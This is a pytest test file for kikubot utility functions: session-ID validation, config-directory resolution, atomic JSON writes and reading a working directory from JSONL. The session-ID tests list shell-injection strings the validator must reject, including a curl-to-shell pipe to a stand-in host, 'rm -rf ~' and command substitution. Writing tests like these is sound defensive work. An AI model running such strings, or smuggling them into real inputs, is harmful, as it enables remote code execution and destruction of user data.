"""Tests for kikubot.utils: kikubot_dir, atomic_write_json, read_cwd_from_jsonl."""

import json
from pathlib import Path

import pytest

from kikubot.utils import (
    atomic_write_json,
    kikubot_dir,
    is_valid_session_id,
    read_cwd_from_jsonl,
)


class TestIsValidSessionId:
    """Guards the audit HIGH#1 injection barrier — a session_id typed into the
    pane's shell must be UUID-shaped (no metacharacters)."""

    def test_accepts_uuid_shaped(self):
        assert is_valid_session_id("11111111-2222-3333-4444-555555555555")
        assert is_valid_session_id("abc12345")  # 8-char minimum

    def test_rejects_shell_metacharacters(self):
        for bad in (
            "x; curl evil | sh",
            "$(rm -rf ~)",
            "a`whoami`",
            "a b",
            "a&&b",
            "id/../../etc",
            "a\nb",
            "aaaaaaaa\n",  # trailing newline ($ vs \Z): would send an early Enter
            "aaaaaaaa\nrm -rf",
        ):
            assert not is_valid_session_id(bad), bad

    def test_rejects_empty_none_and_out_of_range(self):
        assert not is_valid_session_id(None)
        assert not is_valid_session_id("")
        assert not is_valid_session_id("short")  # < 8 chars
        assert not is_valid_session_id("a" * 65)  # > 64 chars


class TestKikubotDir:
    def test_returns_env_var_path(self, monkeypatch: pytest.MonkeyPatch):
        monkeypatch.setenv("KIKUBOT_DIR", "/custom/config")
        assert kikubot_dir() == Path("/custom/config")

    def test_returns_default_without_env(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ):
        monkeypatch.delenv("KIKUBOT_DIR", raising=False)
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        assert kikubot_dir() == tmp_path / ".kikubot"

    def test_an_unmigrated_ccbot_install_keeps_its_dir(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ):
        # Agents' hooks run the new code before the bot restarts and migrates;
        # they must keep writing where the still-running old bot reads.
        monkeypatch.delenv("KIKUBOT_DIR", raising=False)
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        (tmp_path / ".ccbot").mkdir()
        assert kikubot_dir() == tmp_path / ".ccbot"
        monkeypatch.setenv("CCBOT_DIR", "/old/custom")
        assert kikubot_dir() == Path("/old/custom")

    def test_a_migrated_install_uses_the_new_dir(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ):
        monkeypatch.delenv("KIKUBOT_DIR", raising=False)
        monkeypatch.setattr(Path, "home", lambda: tmp_path)
        (tmp_path / ".kikubot").mkdir()
        (tmp_path / ".ccbot").symlink_to(tmp_path / ".kikubot")
        assert kikubot_dir() == tmp_path / ".kikubot"

    def test_expands_tilde(self, monkeypatch: pytest.MonkeyPatch):
        # dotenv does no tilde expansion — a `.env` line `KIKUBOT_DIR=~/.kikubot`
        # must not become a literal `./~` directory.
        monkeypatch.setenv("KIKUBOT_DIR", "~/.kikubot-custom")
        assert kikubot_dir() == Path.home() / ".kikubot-custom"


class TestAtomicWriteJson:
    def test_writes_valid_json(self, tmp_path: Path):
        target = tmp_path / "data.json"
        atomic_write_json(target, {"key": "value"})
        result = json.loads(target.read_text(encoding="utf-8"))
        assert result == {"key": "value"}

    def test_creates_parent_directories(self, tmp_path: Path):
        target = tmp_path / "a" / "b" / "c" / "data.json"
        atomic_write_json(target, [1, 2, 3])
        assert target.exists()
        assert json.loads(target.read_text(encoding="utf-8")) == [1, 2, 3]

    def test_round_trip(self, tmp_path: Path):
        data = {"users": [{"id": 1, "name": "alice"}, {"id": 2, "name": "bob"}]}
        target = tmp_path / "round_trip.json"
        atomic_write_json(target, data)
        assert json.loads(target.read_text(encoding="utf-8")) == data

    def test_no_temp_files_left_on_success(self, tmp_path: Path):
        target = tmp_path / "clean.json"
        atomic_write_json(target, {"ok": True})
        remaining = list(tmp_path.glob(".*tmp*"))
        assert remaining == []


class TestReadCwdFromJsonl:
    def test_cwd_in_first_entry(self, tmp_path: Path):
        f = tmp_path / "session.jsonl"
        f.write_text(json.dumps({"cwd": "/home/user/project"}) + "\n")
        assert read_cwd_from_jsonl(f) == "/home/user/project"

    def test_cwd_in_second_entry(self, tmp_path: Path):
        f = tmp_path / "session.jsonl"
        lines = [
            json.dumps({"type": "init"}),
            json.dumps({"cwd": "/found/here"}),
        ]
        f.write_text("\n".join(lines) + "\n")
        assert read_cwd_from_jsonl(f) == "/found/here"

    def test_no_cwd_returns_empty(self, tmp_path: Path):
        f = tmp_path / "session.jsonl"
        lines = [
            json.dumps({"type": "init"}),
            json.dumps({"type": "message", "text": "hello"}),
        ]
        f.write_text("\n".join(lines) + "\n")
        assert read_cwd_from_jsonl(f) == ""

    def test_missing_file_returns_empty(self, tmp_path: Path):
        assert read_cwd_from_jsonl(tmp_path / "nonexistent.jsonl") == ""
